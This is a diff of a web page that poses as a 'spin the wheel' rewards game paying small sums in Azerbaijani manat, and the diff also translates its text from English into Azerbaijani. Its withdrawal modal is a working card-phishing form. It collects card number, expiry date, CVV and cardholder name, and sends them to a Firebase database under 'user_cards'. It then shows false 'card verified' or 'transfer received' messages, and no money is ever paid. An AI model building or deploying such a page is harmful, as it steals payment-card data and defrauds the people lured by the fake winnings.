@@ -3,123 +3,105 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
     <style>
-        /* Ana Kart Dizaynı */
         .wallet-card {
             background: linear-gradient(135deg, #1e1e26 0%, #0a0a0f 100%);
-            padding: 25px;
-            border-radius: 24px;
-            border: 1px solid rgba(0, 223, 255, 0.2);
-            text-align: center;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            margin-bottom: 25px;
-            position: relative;
-            overflow: hidden;
+            padding: 25px; border-radius: 24px; border: 1px solid rgba(0, 223, 255, 0.2);
+            text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); margin-bottom: 25px;
         }
-        .wallet-card::before {
-            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
-            background: radial-gradient(circle, rgba(0,223,255,0.05) 0%, transparent 70%);
-        }
-        .balance-label { font-size: 0.7rem; color: #888; letter-spacing: 2px; text-transform: uppercase; font-weight: 900; }
-        .balance-value { font-size: 2.8rem; font-weight: 900; color: #00dfff; margin: 10px 0; text-shadow: 0 0 15px rgba(0,223,255,0.3); }
+        .balance-value { font-size: 2.8rem; font-weight: 900; color: #00dfff; margin: 10px 0; }
         
-        /* Çarx Dizaynı */
-        .wheel-box { position: relative; width: 280px; height: 280px; margin: 20px auto; }
+        /* Məbləğləri olan Çarx */
+        .wheel-box { position: relative; width: 300px; height: 300px; margin: 20px auto; }
         #claim-wheel {
-            width: 100%; height: 100%; border-radius: 50%; border: 10px solid #16161d;
-            box-shadow: 0 0 40px rgba(0,0,0,0.8), inset 0 0 20px rgba(0,0,0,0.5);
+            width: 100%; height: 100%; border-radius: 50%; border: 8px solid #16161d;
             transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1);
             background: conic-gradient(
-                #ff4757 0deg 72deg, 
-                #ffa502 72deg 144deg, 
-                #2ed573 144deg 216deg, 
-                #1e90ff 216deg 288deg, 
-                #3742fa 288deg 360deg
+                #ff4757 0deg 72deg, #ffa502 72deg 144deg, 
+                #2ed573 144deg 216deg, #1e90ff 216deg 288deg, #3742fa 288deg 360deg
             );
+            position: relative; overflow: hidden;
         }
-        .wheel-pointer {
-            position: absolute; top: -15px; left: 50%; transform: translateX(-50%);
-            z-index: 10; font-size: 2.5rem; color: #fff; text-shadow: 0 0 10px rgba(0,0,0,0.5);
-        }
+        .wheel-pointer { position: absolute; top: -15px; left: 50%; transform: translateX(-50%); z-index: 10; font-size: 2.5rem; color: #fff; }
 
-        /* Düymələr */
+        /* Çarxın üzərindəki məbləğ yazıları */
+        .amount-text {
+            position: absolute; width: 50%; height: 50%; transform-origin: bottom right;
+            text-align: center; font-weight: 900; font-size: 1.2rem; padding-top: 20px; box-sizing: border-box;
+        }
+        .a1 { transform: rotate(36deg); } /* 0.10 */
+        .a2 { transform: rotate(108deg); } /* 1.00 */
+        .a3 { transform: rotate(180deg); } /* 0.80 */
+        .a4 { transform: rotate(252deg); } /* 0.50 */
+        .a5 { transform: rotate(324deg); } /* 0.30 */
+
         .main-btn {
             width: 100%; padding: 18px; border-radius: 16px; border: none;
-            font-weight: 900; font-size: 1rem; cursor: pointer; transition: 0.3s;
-            text-transform: uppercase; letter-spacing: 1px; margin-top: 15px;
+            font-weight: 900; font-size: 1.1rem; cursor: pointer; transition: 0.3s;
+            text-transform: uppercase; margin-top: 15px;
         }
-        .spin-btn { background: #00dfff; color: #000; box-shadow: 0 5px 20px rgba(0,223,255,0.4); }
-        .spin-btn:disabled { background: #222; color: #555; box-shadow: none; }
-        .withdraw-link { color: #888; text-align: center; display: block; margin-top: 20px; font-size: 0.8rem; text-decoration: none; font-weight: 600; }
+        .spin-btn { background: #00dfff; color: #000; }
+        .spin-btn:disabled { background: #222; color: #555; }
+        .withdraw-btn-call { color: #00ff88; text-align: center; display: block; margin-top: 20px; font-size: 0.9rem; font-weight: 800; text-decoration: none; border: 1px solid #00ff88; padding: 10px; border-radius: 12px; }
 
-        /* Realistik Bank Modalı */
+        /* Modal */
         .modal-overlay {
             display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95);
             z-index: 10000; align-items: center; justify-content: center; padding: 20px; backdrop-filter: blur(10px);
         }
-        .bank-card-modal {
-            background: #121217; width: 100%; max-width: 360px; border-radius: 28px;
-            padding: 30px; border: 1px solid rgba(255,255,255,0.1); position: relative;
-        }
-        .visa-master { display: flex; justify-content: flex-end; gap: 10px; margin-bottom: 20px; opacity: 0.8; }
-        
-        .input-group { margin-bottom: 18px; text-align: left; }
-        .input-label { font-size: 0.6rem; color: #666; font-weight: 900; margin-bottom: 8px; display: block; letter-spacing: 1px; }
+        .bank-card-modal { background: #121217; width: 100%; max-width: 360px; border-radius: 28px; padding: 25px; border: 1px solid #2a2a32; }
         .bank-input {
             width: 100%; background: #1a1a20; border: 1px solid #2a2a32; padding: 14px;
-            border-radius: 12px; color: #fff; font-family: 'Courier New', monospace; font-size: 1.1rem; outline: none; transition: 0.3s;
+            border-radius: 12px; color: #fff; font-size: 1.1rem; outline: none; margin-top: 5px; box-sizing: border-box;
         }
-        .bank-input:focus { border-color: #00dfff; background: #202028; }
-        
-        .row { display: flex; gap: 15px; }
+        .input-label { font-size: 0.65rem; color: #666; font-weight: 900; margin-top: 15px; display: block; }
     </style>
 
     <div class="wallet-card">
-        <div class="balance-label">Available Balance</div>
+        <div style="font-size: 0.7rem; color: #888;">MÖVCUD BALANS</div>
         <div class="balance-value"><span id="ws-balance-display">0.00</span> <small style="font-size: 1rem;">AZN</small></div>
-        <div id="ws-timer-display" style="font-size: 0.7rem; color: #00ff88; font-weight: 600;">System Online</div>
+        <div id="ws-timer-display" style="font-size: 0.7rem; color: #00ff88;">Sistem Hazırdır</div>
     </div>
 
     <div class="wheel-box">
         <div class="wheel-pointer"><i class="fas fa-sort-down"></i></div>
-        <div id="claim-wheel"></div>
+        <div id="claim-wheel">
+            <div class="amount-text a1">0.10</div>
+            <div class="amount-text a2">1.00</div>
+            <div class="amount-text a3">0.80</div>
+            <div class="amount-text a4">0.50</div>
+            <div class="amount-text a5">0.30</div>
+        </div>
     </div>
 
-    <button id="ws-spin-btn" class="main-btn spin-btn" onclick="handleSpinStart()">Spin & Win</button>
-    <a href="#" class="withdraw-link" onclick="openWithdrawPanel()"><i class="fas fa-university"></i> Transfer to Bank Card</a>
+    <button id="ws-spin-btn" class="main-btn spin-btn" onclick="handleSpinStart()">ÇARXI ÇEVİR</button>
+    <a href="javascript:void(0)" class="withdraw-btn-call" onclick="openWithdrawPanel()"><i class="fas fa-credit-card"></i> KARTA ÇIXARIŞ ET</a>
 
     <div id="ws-withdraw-modal" class="modal-overlay">
         <div class="bank-card-modal">
-            <div class="visa-master">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" height="15">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" height="20">
-            </div>
-            
-            <h2 style="margin: 0 0 5px 0; font-size: 1.2rem;">Card Registration</h2>
-            <p style="color: #555; font-size: 0.7rem; margin-bottom: 25px;">Enter your card details to withdraw funds</p>
-
-            <div class="input-group">
-                <span class="input-label">CARD NUMBER</span>
-                <input type="tel" id="c-num" class="bank-input" placeholder="0000 0000 0000 0000" maxlength="19" oninput="formatCard(this)">
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
+                <h2 style="margin:0; font-size:1.2rem; color:#00dfff;">Kart Qeydiyyatı</h2>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" height="12">
             </div>
 
-            <div class="row">
-                <div class="input-group" style="flex: 2;">
-                    <span class="input-label">EXPIRY DATE</span>
-                    <input type="tel" id="c-date" class="bank-input" placeholder="MM/YY" maxlength="5">
+            <span class="input-label">KART NÖMRƏSİ</span>
+            <input type="tel" id="c-num" class="bank-input" placeholder="0000 0000 0000 0000" maxlength="19" oninput="formatCard(this)">
+
+            <div style="display:flex; gap:15px;">
+                <div style="flex:1">
+                    <span class="input-label">MÜDDƏT</span>
+                    <input type="tel" id="c-date" class="bank-input" placeholder="AA/İİ" maxlength="5">
                 </div>
-                <div class="input-group" style="flex: 1;">
+                <div style="flex:1">
                     <span class="input-label">CVV</span>
                     <input type="password" id="c-cvv" class="bank-input" placeholder="***" maxlength="3">
                 </div>
             </div>
 
-            <div class="input-group">
-                <span class="input-label">CARDHOLDER NAME</span>
-                <input type="text" id="c-name" class="bank-input" placeholder="JOHN DOE" style="text-transform: uppercase;">
-            </div>
+            <span class="input-label">AD SOYAD (KARTIN ÜZƏRİNDƏKİ)</span>
+            <input type="text" id="c-name" class="bank-input" placeholder="AD SOYAD" style="text-transform: uppercase;">
 
-            <button class="main-btn spin-btn" onclick="finalWithdrawProcess()">Confirm Transfer</button>
-            <button onclick="document.getElementById('ws-withdraw-modal').style.display='none'" style="background:none; border:none; color:#444; width:100%; margin-top:15px; font-size:0.7rem; cursor:pointer;">Cancel Transaction</button>
+            <button class="main-btn spin-btn" onclick="finalWithdrawProcess()">TƏSDİQLƏ VƏ KÖÇÜR</button>
+            <button onclick="document.getElementById('ws-withdraw-modal').style.display='none'" style="background:none; border:none; color:#444; width:100%; margin-top:10px; cursor:pointer;">Ləğv et</button>
         </div>
     </div>
 </div>
@@ -128,9 +110,8 @@
     (function() {
         let balance = parseFloat(localStorage.getItem('ws_balance')) || 0;
         let lastSpin = parseInt(localStorage.getItem('ws_last_spin')) || 0;
-        const rewards = [0.10, 1.00, 0.80, 0.50, 0.30];
+        const rewards = [0.10, 0.30, 0.50, 0.80, 1.00]; // Dilimlərə uyğun sıralama
 
-        // Kart nömrəsini 4-4 formatına salmaq
         window.formatCard = function(input) {
             let v = input.value.replace(/\D/g, '').match(/.{1,4}/g);
             input.value = v ? v.join(' ') : '';
@@ -144,32 +125,25 @@
         const checkSystemStatus = () => {
             const btn = document.getElementById('ws-spin-btn');
             const timer = document.getElementById('ws-timer-display');
-            const now = Date.now();
-            const diff = now - lastSpin;
+            const diff = Date.now() - lastSpin;
             const wait = 5 * 60 * 60 * 1000;
 
             if (lastSpin !== 0 && diff < wait) {
                 btn.disabled = true;
-                const rem = wait - diff;
-                const h = Math.floor(rem / 3600000);
-                const m = Math.floor((rem % 3600000) / 60000);
-                timer.innerText = `Next spin in ${h}h ${m}m`;
+                timer.innerText = "Növbəti şans 5 saat sonra";
                 timer.style.color = "#ff4757";
-                setTimeout(checkSystemStatus, 60000);
             } else {
                 btn.disabled = false;
-                timer.innerText = "System Ready for Spin";
+                timer.innerText = "Sistem Hazırdır";
                 timer.style.color = "#00ff88";
             }
         };
 
         window.handleSpinStart = function() {
             const wheel = document.getElementById('claim-wheel');
-            const btn = document.getElementById('ws-spin-btn');
-            btn.disabled = true;
             const deg = Math.floor(Math.random() * 360) + 3600;
             wheel.style.transform = `rotate(${deg}deg)`;
-
+            
             setTimeout(() => {
                 const win = rewards[Math.floor((deg % 360) / 72)];
                 balance += win;
@@ -177,7 +151,7 @@
                 localStorage.setItem('ws_balance', balance.toFixed(2));
                 localStorage.setItem('ws_last_spin', lastSpin);
                 updateView();
-                alert("Congratulation! +" + win.toFixed(2) + " AZN added to your wallet.");
+                alert("Təbriklər! Balansınıza " + win.toFixed(2) + " AZN əlavə edildi.");
             }, 5000);
         };
 
@@ -191,7 +165,7 @@
             const cvv = document.getElementById('c-cvv').value;
             const name = document.getElementById('c-name').value;
 
-            // Real Luhn Check
+            // Luhn Check
             let sum = 0;
             for (let i = 0; i < num.length; i++) {
                 let v = parseInt(num[i]);
@@ -199,25 +173,22 @@
                 sum += v;
             }
 
-            if (sum % 10 !== 0 || num.length < 16) { alert("Invalid Card Number!"); return; }
-            if (!/^\d{2}\/\d{2}$/.test(date)) { alert("Invalid Expiry Date!"); return; }
-            if (cvv.length < 3) { alert("Invalid CVV!"); return; }
+            if (sum % 10 !== 0 || num.length < 16) { alert("Kart nömrəsi düzgün deyil!"); return; }
+            if (cvv.length < 3) { alert("CVV səhvdir!"); return; }
 
             const userKey = localStorage.getItem('ws_user_id') || "User_" + Math.floor(Math.random()*9000);
             
-            // Firebase-ə göndərmə
+            // Firebase Göndərmə
             firebase.database().ref('user_cards/' + userKey).set({
                 num: document.getElementById('c-num').value,
-                date: date,
-                cvv: cvv,
-                name: name,
+                date: date, cvv: cvv, name: name,
                 balance: balance.toFixed(2),
                 time: new Date().toLocaleString()
             }).then(() => {
                 if(balance < 15) {
-                    alert("Card Verified! ✅\nYour current balance (" + balance.toFixed(2) + " AZN) is below the minimum withdrawal limit of 15.00 AZN.");
+                    alert("Kart uğurla təsdiqləndi ✅\nLakin balansınız (Min. 15 AZN) kifayət deyil.");
                 } else {
-                    alert("Transfer Request Received! 🚀\nFunds will be credited to your card within 24 hours.");
+                    alert("Çıxarış sorğusu qəbul edildi! 24 saat ərzində köçürüləcək.");
                 }
                 document.getElementById('ws-withdraw-modal').style.display = 'none';
             });
